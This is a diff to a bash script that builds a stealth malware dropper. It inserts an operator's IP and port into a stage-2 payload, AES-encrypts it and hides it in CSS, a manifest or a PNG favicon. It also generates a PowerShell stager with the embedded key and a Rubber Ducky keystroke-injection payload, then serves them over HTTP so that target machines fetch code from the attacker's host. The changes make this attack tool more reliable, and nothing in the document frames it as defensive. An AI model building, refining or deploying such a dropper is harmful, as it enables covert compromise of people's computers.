@@ -1,6 +1,5 @@
 #!/bin/bash
 
-# === Stealth Dropper Builder (2025 Edition) ===
 set -e
 PROJECT_DIR=$(pwd)
 cd "$PROJECT_DIR"
@@ -13,8 +12,8 @@ FINAL_STAGE1="$OUTPUT_DIR/final_stage1.ps1"
 DUCKY_FILE="$OUTPUT_DIR/ducky_payload.txt"
 
 mkdir -p "$OUTPUT_DIR"
+mkdir -p "$WEB_DIR"
 
-# === Auto-discover local IPs ===
 echo "[*] Available local IP addresses:"
 ip_list=($(hostname -I))
 for i in "${!ip_list[@]}"; do echo "  [$i] ${ip_list[$i]}"; done
@@ -23,7 +22,6 @@ IP=${ip_list[$ip_index]}
 read -p "[*] Enter PORT (default 8000): " PORT
 PORT=${PORT:-8000}
 
-# === Select OS and Payload ===
 echo "[*] Choose target OS:"
 select OS in windows linux mac; do break; done
 
@@ -34,7 +32,6 @@ select PAYLOAD in $PAYLOADS; do break; done
 echo "[*] Choose delivery method (recommended: css):"
 select DELIVERY in css manifest png; do break; done
 
-# === Set paths ===
 PAYLOAD_DIR="payloads/$OS/$PAYLOAD"
 STAGE2_RAW="$PAYLOAD_DIR/raw.ps1"
 STAGER_FILE="stagers/powershell/template.ps1"
@@ -50,12 +47,17 @@ case "$OS" in
     ;;
 esac
 
-# === Encrypt Stage 2 ===
-echo "[*] Encrypting payload with AES..."
-ENCODED=$(python3 tools/encrypt_aes.py "$STAGE2_RAW")
-echo "$ENCODED" > "$ENCODED_FILE"
+# Создаем временную копию сырого пейлоада и заменяем IP и порт
+TMP_PAYLOAD="$OUTPUT_DIR/tmp_raw_payload"
+cp "$STAGE2_RAW" "$TMP_PAYLOAD"
+sed -i "s/REPLACE_IP/$IP/g" "$TMP_PAYLOAD"
+sed -i "s/REPLACE_PORT/$PORT/g" "$TMP_PAYLOAD"
 
-# === Embed in delivery ===
+echo "[*] Encrypting payload with AES..."
+ENCODED=$(python3 tools/encrypt_aes.py "$TMP_PAYLOAD") || { echo "[!] Encryption failed"; exit 1; }
+echo "$ENCODED" > "$ENCODED_FILE"
+rm "$TMP_PAYLOAD"
+
 if [[ "$DELIVERY" == "css" ]]; then
   python3 tools/embed_in_css.py "$ENCODED_FILE" "$WEB_DIR/style.css"
 elif [[ "$DELIVERY" == "manifest" ]]; then
@@ -64,32 +66,34 @@ elif [[ "$DELIVERY" == "png" ]]; then
   python3 tools/embed_in_png.py "$ENCODED_FILE" "$WEB_DIR/favicon.png" "$WEB_DIR/favicon.png"
 fi
 
-# === Build stager ===
 KEY=$(grep ENCRYPTION_KEY .env | cut -d= -f2 | tr -d '\r\n')
+KEY_HEX=$(echo -n "$KEY" | xxd -p | tr -d '\n')
 
-STAGER_CONTENT=$(cat "$STAGER_FILE")
-STAGER_CONTENT="${STAGER_CONTENT//REPLACE_AES/$ENCODED}"
-STAGER_CONTENT="${STAGER_CONTENT//REPLACE_KEY/$KEY}"
+escape_for_sed() {
+  echo "$1" | sed -e 's/[\/&]/\\&/g'
+}
+
+ENCODED_ESCAPED=$(escape_for_sed "$ENCODED")
+KEY_HEX_ESCAPED=$(escape_for_sed "$KEY_HEX")
+
+STAGER_CONTENT=$(sed -e "s/REPLACE_AES/${ENCODED_ESCAPED}/g" -e "s/REPLACE_KEY/${KEY_HEX_ESCAPED}/g" "$STAGER_FILE")
 
 echo "$STAGER_CONTENT" > "$FINAL_STAGE1"
 echo "[+] Final stage1 saved to $FINAL_STAGE1"
 
-# === Copy final_stage1 to web dir for HTTP delivery ===
 cp "$FINAL_STAGE1" "$WEB_DIR/final_stage1.sh"
 echo "[+] Copied final_stage1.sh to $WEB_DIR"
 
-# === Generate Ducky HID command dynamically by OS ===
 echo "[*] Generating Ducky payload..."
 python3 tools/generate_ducky.py "$IP" "$PORT" 1000 "$DUCKY_FILE" "$OS"
 echo "[+] Ducky HID command saved to $DUCKY_FILE"
 
-# === Start Web Server ===
 cd "$WEB_DIR"
 echo "[*] Serving payloads at http://$IP:$PORT"
-python3 -m http.server "$PORT"
+python3 -m http.server "$PORT" &
 
-# === Save to config ===
 cd "$PROJECT_DIR"
+
 cat > "$CONFIG_FILE" <<EOF
 {
   "last_used": {
@@ -108,3 +112,7 @@ cat > "$CONFIG_FILE" <<EOF
   }
 }
 EOF
+
+echo "[*] Payload ready."
+echo "[*] Serve URL: http://$IP:$PORT/"
+echo "[*] Ducky payload saved: $DUCKY_FILE"
